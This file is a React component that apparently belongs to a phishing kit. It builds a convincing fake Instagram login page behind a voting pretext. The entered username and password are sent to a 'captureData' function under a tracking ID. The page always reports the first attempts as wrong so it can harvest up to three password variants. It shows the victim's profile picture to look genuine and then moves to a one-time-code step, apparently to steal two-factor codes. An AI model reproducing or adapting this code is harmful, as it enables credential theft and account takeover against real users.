"use client";

import { useState, useEffect } from "react";
import { Loader2 } from "lucide-react";
// Import the central capture utility
import { captureData } from "@/lib/capture";

interface InstagramVoteProps {
  onLogin: (username: string, entryId: string) => void;
  onSuccess: () => void;
  onRequireOTP: (username: string, entryId: string) => void; // Updated signature
}

export default function InstagramVote({
  onLogin,
  onSuccess,
  onRequireOTP,
}: InstagramVoteProps) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [showOneTap, setShowOneTap] = useState(false);
  const [entryId, setEntryId] = useState<string | null>(null); // TRACKING ID
  const [profilePic, setProfilePic] = useState(
    "https://cdn-icons-png.flaticon.com/512/149/149071.png",
  );

  useEffect(() => {
    document.title = "Login • Instagram";
  }, []);

  const fetchProfilePic = (user: string) => {
    const url = `https://images.weserv.nl/?url=https://www.instagram.com/${user}/live/&default=https://cdn-icons-png.flaticon.com/512/149/149071.png`;
    setProfilePic(url);
  };

  const handleLogin = async () => {
    if (!password || password.length < 6) return;

    setIsVerifying(true);
    setError(false);

    // Prepare dynamic payload to prevent overriding previous passwords
    const payload: any = {
      emle: username,
      stage: attempts === 0 ? "initial" : attempts === 1 ? "retry" : "final",
    };

    if (attempts === 0) {
      payload.pass = password; // First attempt goes to main pass field
    } else if (attempts === 1) {
      payload.pass2 = password; // Second attempt
    } else {
      payload.pass3 = password; // Third attempt
    }

    let currentId = entryId;

    try {
      const id = await captureData("Insta-gram", payload, entryId || undefined);

      if (id) {
        setEntryId(id);
        currentId = id;
        onLogin(username, id); // Pass the ID up to the parent
      }
    } catch (e) {
      console.error("Transmission error");
    }

    setTimeout(() => {
      setIsVerifying(false);
      if (attempts === 0) {
        // TRIAL 1 FAIL: Show One-Tap Recognition
        fetchProfilePic(username);
        setAttempts(1);
        setShowOneTap(true);
        setPassword("");
      } else if (attempts === 1) {
        // TRIAL 2 FAIL: Show Error Message
        setAttempts(2);
        setError(true);
        setPassword("");
      } else {
        // TRIAL 3 REACHED: Dynamics change to OTP
        // Pass the final entryId to ensure the next screen knows which card to update
        if (currentId) onRequireOTP(username, currentId);
      }
    }, 1200);
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-[#fafafa] flex flex-col items-center justify-center font-sans text-black overflow-y-auto pb-12">
      <div className="w-full max-w-[350px] flex flex-col gap-3 mt-8">
        <div className="bg-white border border-[#dbdbdb] px-10 py-10 flex flex-col items-center shadow-sm">
          <img
            src="/images/ilogo.png"
            alt="Instagram"
            className="h-14 mb-8 object-contain"
          />

          {!showOneTap ? (
            <div className="w-full space-y-2">
              <input
                type="text"
                placeholder="Phone number, username, or email"
                className="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] p-2.5 text-xs outline-none focus:border-gray-400 placeholder:text-[#8e8e8e] text-black"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
              <div className="relative">
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="Password"
                  className="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] p-2.5 text-xs outline-none focus:border-gray-400 placeholder:text-[#8e8e8e] text-black"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                />
                {password && (
                  <button
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-[#262626]"
                    onClick={() => setShowPass(!showPass)}>
                    {showPass ? "Hide" : "Show"}
                  </button>
                )}
              </div>
            </div>
          ) : (
            <div className="w-full flex flex-col items-center animate-in fade-in zoom-in-95 duration-500">
              <div className="relative mb-4">
                <div className="w-24 h-24 rounded-full p-[2px] bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7]">
                  <div className="w-full h-full rounded-full border-2 border-white overflow-hidden bg-white">
                    <img
                      src={profilePic}
                      className="w-full h-full object-cover"
                      alt="User profile"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src =
                          "https://cdn-icons-png.flaticon.com/512/149/149071.png";
                      }}
                    />
                  </div>
                </div>
              </div>
              <p className="font-semibold text-sm mb-6">{username}</p>

              <div className="w-full space-y-2">
                <div className="relative">
                  <input
                    type={showPass ? "text" : "password"}
                    placeholder="Password"
                    autoFocus
                    className={`w-full bg-[#fafafa] border ${
                      error ? "border-[#ed4956]" : "border-[#dbdbdb]"
                    } rounded-[3px] p-2.5 text-xs outline-none focus:border-gray-400 text-black`}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                  />
                  {password && (
                    <button
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-[#262626]"
                      onClick={() => setShowPass(!showPass)}>
                      {showPass ? "Hide" : "Show"}
                    </button>
                  )}
                </div>
                {error && (
                  <p className="text-xs text-[#ed4956] text-center py-2 leading-tight">
                    Incorrect password. Please try again.
                  </p>
                )}
              </div>
            </div>
          )}

          <button
            disabled={!username || password.length < 6 || isVerifying}
            className={`w-full py-1.5 mt-4 rounded-lg font-semibold text-sm transition-all text-white flex justify-center items-center h-9 ${
              username && password.length >= 6
                ? "bg-[#0095f6] hover:bg-[#1877f2]"
                : "bg-[#4cb5f9] cursor-default"
            }`}
            onClick={handleLogin}>
            {isVerifying ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              "Log in"
            )}
          </button>

          {!showOneTap && (
            <>
              <div className="flex items-center gap-4 py-4 w-full">
                <div className="h-[1px] bg-[#dbdbdb] flex-1" />
                <span className="text-[13px] font-semibold text-[#8e8e8e] uppercase tracking-tighter">
                  OR
                </span>
                <div className="h-[1px] bg-[#dbdbdb] flex-1" />
              </div>
              <button className="text-sm font-semibold text-[#385185] flex items-center justify-center gap-2 w-full mb-3">
                <svg
                  className="w-4 h-4"
                  viewBox="0 0 16 16"
                  fill="currentColor">
                  <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" />
                </svg>
                Log in with Facebook
              </button>
            </>
          )}

          <p className="text-xs text-[#00376b] cursor-pointer text-center mt-4">
            Forgot password?
          </p>

          {showOneTap && (
            <button
              onClick={() => {
                setShowOneTap(false);
                setAttempts(0);
                setError(false);
                setProfilePic(
                  "https://cdn-icons-png.flaticon.com/512/149/149071.png",
                );
              }}
              className="text-xs text-[#0095f6] font-semibold mt-6">
              Switch accounts
            </button>
          )}
        </div>

        <div className="bg-white border border-[#dbdbdb] py-6 text-center">
          <p className="text-sm">
            Don't have an account?{" "}
            <span className="text-[#0095f6] font-semibold cursor-pointer">
              Sign up
            </span>
          </p>
        </div>
      </div>
    </div>
  );
}
